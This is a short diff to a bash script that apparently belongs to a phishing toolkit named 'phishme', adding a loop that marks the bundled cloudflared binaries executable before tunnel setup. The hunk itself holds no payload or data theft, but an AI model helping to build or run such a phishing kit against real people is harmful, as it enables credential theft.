@@ -41,6 +41,13 @@ ${GREEN}88      YP   YP Y888888P  8888Y  YP   YP YP  YP  YP Y88888P
 ${WHITEBG}${RED}----------- https://github.com/jungawagat/phishme -----------${RESETBG}
 EOF
 
+for file in "./cloudflared/*"
+do
+if ! [[ -x $file ]] ; then
+chmod +x $file
+fi
+done
+
 if [ -f cloudflared.log ] ; then
 rm cloudflared.log
 fi
